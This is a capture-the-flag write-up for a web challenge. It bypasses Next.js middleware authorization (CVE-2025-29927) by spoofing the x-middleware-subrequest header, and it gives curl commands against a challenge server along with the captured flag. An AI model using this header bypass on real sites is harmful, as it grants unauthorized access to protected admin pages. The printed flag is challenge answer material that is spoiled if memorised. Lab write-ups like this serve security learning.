# Melaka Heritage - CTF Write-Up

## Challenge
**URL**: `http://206.189.34.228:8088`  
**Description**: Bypass "state-of-the-art" custom security middleware that blocks recursive sub-requests to access the admin panel.

## Vulnerability
**CVE-2025-29927** - Next.js Middleware Authorization Bypass

The middleware uses `x-middleware-subrequest` header internally to prevent infinite loops. Attackers can exploit this by sending the header externally to skip middleware execution entirely.

## Exploitation

### Step 1: Identify the Protection
```bash
curl -i http://206.189.34.228:8088/admin
# Returns: 307 Redirect to /?error=unauthorized
```

### Step 2: Bypass with CVE-2025-29927
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://206.189.34.228:8088/admin
```

The repeated "middleware" value (5 times) reaches `MAX_RECURSION_DEPTH`, causing the middleware to be skipped.

### Step 3: Extract Flag
```bash
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://206.189.34.228:8088/admin | grep -o 'ictff8{[^}]*}'
```

## Proof

![Admin Panel showing the flag](/home/zisec/Downloads/writeup-taming-final-alumni/Web/Melaka Heritage/flag_proof.png)

## Flag
```
ictff8{MelakaKotaWarisanBersejarah}
```

## Key Insight
The challenge hint "recursive sub-requests" directly pointed to the `x-middleware-subrequest` header vulnerability in Next.js. The middleware checks this header to prevent recursion but doesn't validate if it's coming from an external request.
